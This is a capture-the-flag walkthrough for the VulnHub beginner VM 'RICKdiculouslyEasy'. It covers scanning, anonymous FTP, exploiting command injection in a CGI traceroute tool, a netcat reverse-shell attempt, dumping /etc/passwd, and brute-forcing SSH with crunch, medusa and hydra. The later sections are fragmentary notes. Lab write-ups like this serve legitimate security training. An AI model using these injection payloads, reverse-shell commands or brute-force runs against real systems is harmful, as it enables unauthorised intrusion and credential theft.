# RICKdiculouslyEasy

### Description (from VulnHub)

```
Back to the Top
This is a fedora server vm, created with virtualbox.

It is a very simple Rick and Morty themed boot to root.

There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.

It's designed to be a beginner ctf, if you're new to pen testing, check it out!
```

* * *

## Finding the IP address of the Vuln Machine

`sudo arp-scan 10.0.0.0/24`
![Optional Text](/Rickdiculously%20Easy/_resources/32a1b37e8b2c47cc8ed70ce1e649487f.png)

* * *

## Nmap scan results

```
# Nmap 7.80 scan initiated Wed Apr 21 11:03:27 2021 as: nmap -sC -sV -oA nmapscans/rid-easy 10.0.0.137
Nmap scan report for 10.0.0.137
Host is up (0.00046s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.0.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http       Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp open  http       Cockpit web service
|_http-title: Did not follow redirect to https://10.0.0.137:9090/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# cleNmap done at Wed Apr 21 11:04:03 2021 -- 1 IP address (1 host up) scanned in 36.53 seconds
```

* * *

### Looking at the NAMP scan results

I look at `https://10.0.0.137:9090/` and I see bewlow image. We got our First Flag! 
Other than the flag there didn't seem to be much here so I moved on and  attempted an anonymous login via FTP.
![Optional Text](/Rickdiculously%20Easy/_resources/28c5f1cc424b4876b5ee99bb7015065d.png)

### FTP Anonymous Login
I used `ftp 10.0.0.137` to connect and for the **username&passwords** I used **Anonymous** when prompted.
![Optional Text](/Rickdiculously%20Easy/_resources/a3e9dd56c2494a4eba13be892a99165f.png)

Looks like another Flag.

I used `wget -m ftp://anonymous:anonymous@10.0.0.137` to retrieve the file(s)

Looks like we got our second flag!

![Optional Text](/Rickdiculously%20Easy/_resources/380d1b0562be4575a485325880fd6713.png)

So far we found 2 flags for a total of 20 points 110 points left to go.
* * *

## Nikto scan results

`nikto -h 10.0.0.137:80`
![Optional Text](/Rickdiculously%20Easy/_resources/e80a8432e21b47f8bb96a19a801c69a9.png)

* * *

Checking Out the /passwords/ dir I see:
![Optional Text](/Rickdiculously%20Easy/_resources/583ddbbb5a134746a502bbbdd01d5b6d.png)

* * *

After Clicking on FLAG.txt I see:
![Optional Text](/Rickdiculously%20Easy/_resources/a149221d696b42239fedfef08d456a1d.png)

* * *

Clicking on the passwords.html I see:
![Optional Text](/Rickdiculously%20Easy/_resources/be61f44dc89b433995b0bdda425d1160.png)

**The message**

```
Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.
```

* * *

Looking at the source of `10.0.0.137/passwords/passwords.html` I see:
![Optional Text](/Rickdiculously%20Easy/_resources/3be9c5f2d8c34c6e8156c476ac324836.png)

* * *

Great as of right now we have a password `winter` and 30 points found 100 left to go!

Looking at `http://10.0.0.137/robots.txt` I see:
![Optional Text](/Rickdiculously%20Easy/_resources/8279bcc2dac9489096951170c9a55b04.png)

Looks like another set of directories

```
/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*

```

`10.0.0.137/cgi-bin/root_shell.cgi`
![Optional Text](/Rickdiculously%20Easy/_resources/c1d060c970384b449cadc580c55915b8.png)

`http://10.0.0.137/cgi-bin/tracertool.cgi`
![Optional Text](/Rickdiculously%20Easy/_resources/9ac3412d75fd4194b063f8a52debd39d.png)

Looking over everything I found so far I decided to dig into `http://10.0.0.137/cgi-bin/tracertool.cgi` a little further.

After testing the input I releazed it was suscpetialbe to command injection

`1.1.1.1;uname -r` returned
4.11.8-300.fc26.x86_64

So lets see if I can get a shell, what would be great is if the vuln machine had netcat
So I decided to see if it did

`1.1.1.1;man nc`

![Optional Text](/Rickdiculously%20Easy/_resources/9b996bd49cb441eba744c47f1d8e2a53.png)

python3 -m http.server 8000

curl http://127.0.0.1:8001/1.txt

:nl /etc/passwd

![Optional Text](/Rickdiculously%20Easy/_resources/6a8dee2210714497bd66728abccf025e.png)

Great now we have some usernames
27 RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
28 Morty:x:1001:1001::/home/Morty:/bin/bash
29 Summer:x:1002:1002::/home/Summer:/bin/bash
30 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

ls /home/RickSanchez
ls /home/Morty

## FTP Login

After user creds Summer:winter I was able to get an FTP login
![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)

## You can login using the sequence below

Ftp Command=`ftp 10.0.0.137`
Username=`Summer`
Password=`winter`

`wget -m ftp://anonymous:anonymous@10.0.0.137`

ls /home/RickSanchez
ls /home/Morty

;touch /usr/bin/hello.txt


;base64 --decode /tmp/open.sh > /tmp/resh.sh
;echo nc 10.0.0.186 7878 >> /tmp/resh.sh

[http://10.0.0.0.137/cgi-bin/tracertool.cgi?parameter=||whoami](http://10.0.0.0.137/cgi-bin/tracertool.cgi?

[http://10.0.0.137/cgi-bin/tracertool.cgi?ip=||whoami>/var/www/output.txt||](http://10.0.0.137/cgi-bin/tracertool.cgi?ip=%7C%7Cwhoami%3E/var/www/output.txt%7C%7C)

![Optional Text](/Rickdiculously%20Easy/_resources/9cdc677064af42528e30c76533c43823.png)

![Optional Text](/Rickdiculously%20Easy/_resources/1db82e2b853c4415a3f1f55b438e93b0.png)

Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

20 points

Anyway. Here it is:

Here it is:

./safe 131333

![Optional Text](/Rickdiculously%20Easy/_resources/a932636ee913450eb6a3bfa08c8ca6fb.png)


[Had to do some reading](https://www.rootinstall.com/tutorial/creating-custom-wordlists-using-crunch-utility/)
  
 1227  crunch 5 5 -t ,%the -o password.txt 
 1229  crunch 5 5 -t ,%The >> password.txt 
 1230  crunch 7 7 -t ,%Flesh >> password.txt 
 1231  crunch 7 7 -t ,%flesh >> password.txt 
 1232  crunch 9 9 -t ,%curtains >> password.txt 
 1233  crunch 10 10 -t ,%curtains >> password.txt 
 1234  crunch 10 10 -t ,%Curtains >> password.txt 


medusa -u RickSanchez -P password.txt -h 10.0.0.137 -M ssh -n 22222 -f

![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]**strong text**

## !!Optional!!
I also used cupp.py to generate passwords. Really easy to use tool
[GitHub For Cupp.py](https://github.com/Mebus/cupp)

run ./cupp.py -i
![Optional Text](/Rickdiculously%20Easy/_resources/809a450dc68d431c89b94e25f145b714.png)

Used hyrdra install of medusa 
hydra -l RickSanchez -P the.txt 10.0.0.137 -s22222 ssh

![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]

